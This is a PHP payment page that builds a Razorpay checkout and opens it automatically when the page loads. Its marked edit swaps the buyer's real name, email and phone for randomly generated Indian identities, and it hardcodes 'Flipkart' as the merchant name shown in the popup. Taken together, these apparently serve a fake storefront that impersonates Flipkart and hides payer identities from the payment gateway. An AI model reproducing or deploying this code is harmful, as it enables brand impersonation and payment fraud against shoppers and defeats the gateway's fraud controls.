<?php
// PHP Error Reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

session_start();
include('database/connection.php');
require('vendor/autoload.php');

use Razorpay\Api\Api;

// POST મેથડથી ડેટા આવે છે કે નહીં તે તપાસો
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['final_amount']) || empty($_POST['final_amount'])) {
    die("Invalid access. Please proceed from the checkout page.");
}

// POST માંથી આવેલો ડેટા મેળવો
$final_payable_amount = number_format($_POST['final_amount'], 2, '.', '');


// ======================== અહીં ફેરફાર શરૂ થાય છે ========================
// POST માંથી આવતા ગ્રાહક ડેટાને બદલે રેન્ડમ ડેટા જનરેટ કરો

// 1. નામ, છેલ્લું નામ અને ઇમેઇલ ડોમેન્સ માટે ડેટા પૂલ બનાવો
$first_names = [
    "Aarav", "Aarush", "Aaryan", "Aayush", "Abhay", "Abhinav", "Abhishek", "Aditya", "Akshay", "Aman",
    "Amit", "Amrit", "Anand", "Aniket", "Anirudh", "Ankit", "Ankur", "Ansh", "Anubhav", "Arjun",
    "Arnav", "Arun", "Aryan", "Ashish", "Atharva", "Atul", "Avanish", "Ayush", "Bharat", "Bhaskar",
    "Chandan", "Charandeep", "Chetan", "Chiranjeev", "Daksh", "Darshan", "Deepak", "Dev", "Dhanush", "Dhruv",
    "Divyansh", "Gaurav", "Gautam", "Gagan", "Gurpreet", "Harsh", "Harshit", "Hemant", "Himanshu", "Hitesh",
    "Indrajeet", "Ishaan", "Jagdish", "Jai", "Jay", "Jayesh", "Jitendra", "Karan", "Karthik", "Keshav",
    "Krishna", "Kunal", "Lakshya", "Lalit", "Madhav", "Manish", "Mayank", "Mohak", "Mohit", "Nakul",
    "Naman", "Naveen", "Nikhil", "Nilesh", "Nishant", "Nitin", "Om", "Pankaj", "Parth", "Piyush",
    "Prakash", "Prashant", "Prateek", "Praveen", "Prayag", "Prem", "Prince", "Prithvi", "Rahul", "Raj",
    "Rajan", "Rajat", "Rajeev", "Rajesh", "Rakesh", "Ram", "Raman", "Ramesh", "Ranveer", "Ravi",
    "Rishabh", "Ritesh", "Rohan", "Rohit", "Roshan", "Sachin", "Sahil", "Sai", "Samar", "Sameer",
    "Sanjay", "Sanket", "Sarthak", "Saurabh", "Shashank", "Shivam", "Shubham", "Siddharth", "Soham", "Somesh",
    "Srinivas", "Subhash", "Sudeep", "Sujay", "Suman", "Sumit", "Sunil", "Suraj", "Suresh", "Surya",
    "Sushant", "Tanmay", "Tarun", "Tejas", "Udit", "Ujjwal", "Utkarsh", "Vaibhav", "Varun", "Vedant",
    "Vicky", "Vidhur", "Vidyut", "Vihan", "Vihaan", "Vijay", "Vikram", "Vikrant", "Vinay", "Vinit",
    "Vipin", "Viraj", "Vishal", "Vishnu", "Vivaan", "Yash", "Yogesh", "Yuvraj", "Zain", "Zeeshan",
    "Aadhya", "Aahana", "Aanya", "Aarohi", "Aashi", "Aastha", "Aditi", "Aishwarya", "Akansha", "Akshata",
    "Alia", "Amisha", "Amrita", "Ananya", "Anika", "Anjali", "Ankita", "Anshika", "Anu", "Anuja",
    "Anupama", "Anushka", "Anuradha", "Anvi", "Archana", "Arpita", "Arya", "Ashna", "Avani", "Bhavana",
    "Bhoomi", "Chahna", "Charu", "Chetna", "Daksha", "Damini", "Deepika", "Devika", "Dhara", "Diksha",
    "Divya", "Diya", "Esha", "Gargi", "Garima", "Gayatri", "Geeta", "Gouri", "Hamsini", "Harshita",
    "Heena", "Ira", "Ishani", "Ishita", "Jahnvi", "Jasmin", "Jhanvi", "Jiya", "Jyoti", "Kajal",
    "Kalyani", "Kanishka", "Kashish", "Kavya", "Khushi", "Kirti", "Krishna", "Kriti", "Lakshmi", "Lalita",
    "Madhavi", "Mahi", "Manjari", "Manisha", "Meera", "Megha", "Meghana", "Mira", "Mohan", "Monika",
    "Mrunal", "Mukti", "Naina", "Namrata", "Nandini", "Neha", "Nidhi", "Niharika", "Nikita", "Nisha",
    "Nishita", "Nitya", "Pallavi", "Pari", "Pooja", "Pragya", "Prachi", "Pranali", "Prerana", "Priya",
    "Priyanka", "Radha", "Ragini", "Rajeshwari", "Rakhi", "Rani", "Rashi", "Rati", "Ria", "Riddhi",
    "Ritika", "Riya", "Rohini", "Roshan", "Ruchi", "Rukmini", "Rupali", "Saanvi", "Sadhana", "Sakshi",
    "Samaira", "Samiksha", "Sana", "Sanjana", "Sanskriti", "Santoshi", "Sarika", "Shanaya", "Shanti", "Shivani",
    "Shreya", "Shruti", "Simran", "Sita", "Sneha", "Sonal", "Sonia", "Soumya", "Suhani", "Sumaira",
    "Sunita", "Surabhi", "Sushma", "Swara", "Swati", "Tanvi", "Tanya", "Tara", "Trisha", "Tulsi",
    "Ujjwala", "Uma", "Urvi", "Vaidehi", "Vaishnavi", "Vandana", "Vani", "Varsha", "Vasudha", "Veda",
    "Vedika", "Vidya", "Vimala", "Vineeta", "Vrinda", "Yamini", "Yashoda", "Yukti", "Zara", "Zoya"
];

$last_names = [
    "Patel", "Shah", "Sharma", "Singh", "Gupta", "Kumar", "Mehta", "Joshi", "Verma", "Khan",
    "Desai", "Jain", "Mishra", "Yadav", "Chauhan", "Thakur", "Pandey", "Agrawal", "Rathod", "Solanki",
    "Trivedi", "Tiwari", "Reddy", "Naik", "Rao", "Malik", "Sinha", "Choudhary", "Gandhi", "Saxena",
    "Bhatt", "Dave", "Goswami", "Bansal", "Das", "Dutta", "Bose", "Banerjee", "Chakraborty", "Mukherjee",
    "Sen", "Ghosh", "Nair", "Menon", "Pillai", "Krishnan", "Iyer", "Pillai", "Subramanian", "Suresh",
    "Rajan", "Lal", "Shukla", "Bhardwaj", "Bhatia", "Agarwal", "Garg", "Goel", "Arora", "Kapoor",
    "Khanna", "Malhotra", "Gill", "Sethi", "Chopra", "Mehra", "Sarin", "Bedi", "Grewal", "Sodhi",
    "Dhillon", "Chahal", "Bajwa", "Randhawa", "Kaur", "Kundra", "Walia", "Virk", "Saini", "Phogat",
    "Shetty", "Hegde", "Kamath", "Pai", "Bhat", "Almeida", "Fernandes", "D'Souza", "Pereira", "Rodrigues",
    "Mendes", "Correia", "Gomes", "Ribeiro", "Miranda", "Fonseca", "Machado", "Alves", "Rocha", "Moreira",
    "Barreto", "Braganza", "Coelho", "Coutinho", "D'Costa", "D'Cruz", "Devi", "Doraiswamy", "Dube", "Dwivedi",
    "Ganesan", "Gowda", "Hegde", "Jadhav", "Jha", "Kamble", "Kashyap", "Kaul", "Kulkarni", "Kumari",
    "Mahajan", "Majumdar", "Mathew", "Mittal", "Mistry", "Mohanty", "Nagar", "Nagarajan", "Nanda", "Narayan",
    "Nath", "Nigam", "Oberoi", "Pandit", "Parikh", "Prabhakar", "Prasad", "Puri", "Raghavan", "Rajput",
    "Raman", "Rastogi", "Sachdev", "Sarin", "Sengupta", "Seth", "Shankar", "Sharma", "Shinde", "Singhal",
    "Somani", "Soni", "Srivastava", "Subramaniam", "Sule", "Talwar", "Tandon", "Tiwari", "Tripathi", "Vaidya",
    "Varghese", "Venkatesan", "Vyas", "Wagle", "Warrier", "Zaveri", "Ahluwalia", "Anand", "Bakshi", "Basu",
    "Chandra", "Chawla", "Dewan", "Ganguly", "Grover", "Johar", "Kapoor", "Khurana", "Kohli", "Madan",
    "Mahindra", "Mehrotra", "Modi", "Monga", "Narula", "Nehru", "Ojha", "Parekh", "Puri", "Ratti",
    "Sahni", "Salvi", "Samanta", "Sarkar", "Seth", "Shah", "Sharma", "Sikand", "Suri", "Talwar",
    "Taneja", "Tara", "Thapar", "Tuli", "Verma", "Vohra", "Wadhwa", "Walia", "Yadav", "Zinta"
];

$email_domains = ['gmail.com', 'yahoo.com', 'outlook.in'];

// 2. રેન્ડમ નામ પસંદ કરો
$random_first_name = $first_names[array_rand($first_names)];
$random_last_name = $last_names[array_rand($last_names)];
$customer_name = $random_first_name . ' ' . $random_last_name;

// 3. રેન્ડમ 10-અંકનો મોબાઈલ નંબર બનાવો (જે 6, 7, 8, અથવા 9 થી શરૂ થાય)
$customer_contact = mt_rand(6, 9) . str_pad(mt_rand(0, 999999999), 9, '0', STR_PAD_LEFT);

// 4. રેન્ડમ ઇમેઇલ એડ્રેસ બનાવો
$email_username = strtolower($random_first_name . '.' . $random_last_name . mt_rand(10, 999));
$customer_email = $email_username . '@' . $email_domains[array_rand($email_domains)];

// htmlspecialchars() નો ઉપયોગ સુરક્ષા માટે કરવો
$customer_name    = htmlspecialchars($customer_name);
$customer_email   = htmlspecialchars($customer_email);
$customer_contact = htmlspecialchars($customer_contact);

// જૂનો કોડ (હવે કોમેન્ટ કરેલ છે)
// $customer_name        = htmlspecialchars($_POST['customer_name'] ?? 'Guest User');
// $customer_email       = htmlspecialchars($_POST['customer_email'] ?? 'guest@example.com');
// $customer_contact     = htmlspecialchars($_POST['customer_contact'] ?? '9999999999');

// ======================== અહીં ફેરફાર પૂરો થાય છે ========================


// ઓર્ડર ID મેનેજ કરો
$order_id = 'ORD_' . time() . rand(100, 999);
$_SESSION['order_id_for_verification'] = $order_id; // વેરિફિકેશન માટે સેશનમાં સ્ટોર કરો

// ડેટાબેઝમાંથી જરૂરી બધી વિગતો મેળવવા માટે વેરીએબલ તૈયાર કરો
$razorpay_key_id = '';
$razorpay_key_secret = '';
$company_name = ''; // પેમેન્ટ પોપ-અપમાં બતાવવા માટે
$runsite_url = '';  // કેન્સલ/ફેઈલ થવા પર રીડાયરેક્ટ કરવા માટે
$pgsite_url = '';   // વેરિફિકેશન ફાઈલ માટેનો પાથ

// ડેટાબેઝમાંથી બધી જરૂરી કિંમતો એક જ વારમાં મેળવો
$creds_result = mysqli_query($conn, "SELECT razorpay_key_id, razorpay_key_secret, site, runsite, pgsite FROM credentials LIMIT 1");
if ($creds_result && $fetch_creds = mysqli_fetch_assoc($creds_result)) {
    $razorpay_key_id     = $fetch_creds['razorpay_key_id'] ?? '';
    $razorpay_key_secret = $fetch_creds['razorpay_key_secret'] ?? '';
    $company_name        = 'Flipkart'; // તમે આને ડેટાબેઝમાંથી $fetch_creds['site'] પણ કરી શકો છો.
    $runsite_url         = $fetch_creds['runsite'] ?? '';
    $pgsite_url          = $fetch_creds['pgsite'] ?? '';
}

// ખાતરી કરો કે જરૂરી બધી વિગતો મળી છે
if (empty($razorpay_key_id) || empty($razorpay_key_secret)) {
    die("Payment gateway is not configured. Please contact support.");
}
if (empty($runsite_url) || empty($pgsite_url)) {
    die("Site path configuration is missing. Please contact support.");
}

// --- Razorpay Order બનાવવાનો કોડ ---
$api = new Api($razorpay_key_id, $razorpay_key_secret);
$amount_in_paise = $final_payable_amount * 100;

try {
    $razorpayOrder = $api->order->create([
        'receipt'         => $order_id,
        'amount'          => $amount_in_paise,
        'currency'        => 'INR',
        'payment_capture' => 1
    ]);
    $razorpay_order_id = $razorpayOrder['id'];
} catch (\Exception $e) {
    die("Error creating Razorpay order: " . $e->getMessage());
}

// ડાયનેમિક URLs બનાવો
$dynamic_runsite_url = rtrim($runsite_url, '/');
$dynamic_pgsite_url = rtrim($pgsite_url, '/');
$verification_action_url = $dynamic_pgsite_url . '/verify-payment.php';
$redirect_on_failure_url = $dynamic_runsite_url . '/order-summary.php';

?>
<!DOCTYPE html>
<html lang="en-IN">
<head>
    <title>Secure Payment</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
    <style>
        body { background-color: #f1f2f4; }
        .main-container { max-width: 600px; margin: 0 auto; background-color: #fff; }
        .page-header { background-color: #fff; padding: 12px 16px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .header-title { font-size: 15px; font-weight: 500; }
        .price-details-card { background-color: #fff; padding: 16px; border-top: 8px solid #f1f2f4; }
        .total-payable-row { font-weight: bold; border-top: 1px dashed #e0e0e0; padding-top: 16px; }
        .page-footer { background: #fff !important; border-top: 1px solid #e0e0e0 !important; position: fixed; bottom: 0; width: 100%; max-width: 600px; padding: 12px 16px; box-shadow: 0 -2px 5px rgba(0,0,0,0.1); }
        .footer-price { font-size: 17px; font-weight: bold; }
        .continue-btn { width: 50%; background-color: #fb641b; color: #fff; border: none; padding: 12px; font-size: 15px; font-weight: 500; border-radius: 4px; }
    </style>
</head>
<body>

<div class="main-container">
    <header class="page-header">
        <div class="header-title">Payment</div>
    </header>

    <main style="padding-bottom: 120px;">
        <div class="p-3">
            <h5 class="fw-bold">Pay using any method</h5>
            <p class="text-muted small">You will be redirected to our secure payment partner Razorpay to complete the payment.</p>
            <img src="https://cdn.razorpay.com/static/assets/pay_methods_branding.png" alt="Payment Methods" class="img-fluid">
        </div>

        <div class="price-details-card">
            <h6 class="fw-bold mb-3">Price Details</h6>
            <div class="d-flex justify-content-between total-payable-row fs-6">
                <span>Total Amount</span>
                <span>₹<?php echo number_format($final_payable_amount); ?></span>
            </div>
        </div>
    </main>

    <footer class="page-footer">
        <div class="d-flex justify-content-between align-items-center">
            <span class="footer-price">₹<?php echo number_format($final_payable_amount); ?></span>
            <button id="rzp-button1" class="btn continue-btn">Pay Now</button>
        </div>
    </footer>
</div>

<script>
// "Pay Now" બટન પર ક્લિક કરવાથી શું થશે તે વ્યાખ્યાયિત કરો
function triggerRazorpay() {
    var options = {
        "key": "<?php echo $razorpay_key_id; ?>",
        "amount": "<?php echo $amount_in_paise; ?>",
        "currency": "INR",
        "name": "<?php echo addslashes(htmlspecialchars($company_name, ENT_QUOTES, 'UTF-8')); ?>",
        "description": "Payment for Order ID: <?php echo $order_id; ?>",
        "order_id": "<?php echo $razorpay_order_id; ?>",
        "handler": function (response){
            document.getElementById('razorpay_payment_id').value = response.razorpay_payment_id;
            document.getElementById('razorpay_order_id').value = response.razorpay_order_id;
            document.getElementById('razorpay_signature').value = response.razorpay_signature;
            document.getElementById('payment-verification-form').submit();
        },
        "prefill": {
            "name": "<?php echo addslashes($customer_name); ?>",
            "email": "<?php echo addslashes($customer_email); ?>",
            "contact": "<?php echo addslashes($customer_contact); ?>"
        },
        "theme": { "color": "#fb641b" },
        "modal": {
            "ondismiss": function(){
                alert('Payment was cancelled.');
                window.location.href = '<?php echo htmlspecialchars($redirect_on_failure_url, ENT_QUOTES, 'UTF-8'); ?>';
            }
        }
    };
    var rzp1 = new Razorpay(options);
    rzp1.on('payment.failed', function (response){
        alert("Payment Failed: " + response.error.description);
        window.location.href = '<?php echo htmlspecialchars($redirect_on_failure_url, ENT_QUOTES, 'UTF-8'); ?>';
    });
    
    rzp1.open();
}

// પેજ લોડ થતાં જ પેમેન્ટ પોપ-અપ ખોલો
window.onload = function() {
    triggerRazorpay();
};

// "Pay Now" બટન પર ક્લિક કરવાથી પણ પોપ-અપ ખુલશે (જો તે આપમેળે ન ખુલે તો)
document.getElementById('rzp-button1').onclick = function(e) {
    e.preventDefault();
    triggerRazorpay();
};
</script>

<!-- વેરિફિકેશન માટે હિડન ફોર્મ -->
<form id="payment-verification-form" action="<?php echo htmlspecialchars($verification_action_url, ENT_QUOTES, 'UTF-8'); ?>" method="POST" style="display: none;">
    <input type="hidden" name="razorpay_payment_id" id="razorpay_payment_id">
    <input type="hidden" name="razorpay_order_id" id="razorpay_order_id">
    <input type="hidden" name="razorpay_signature" id="razorpay_signature">
</form>

</body>
</html>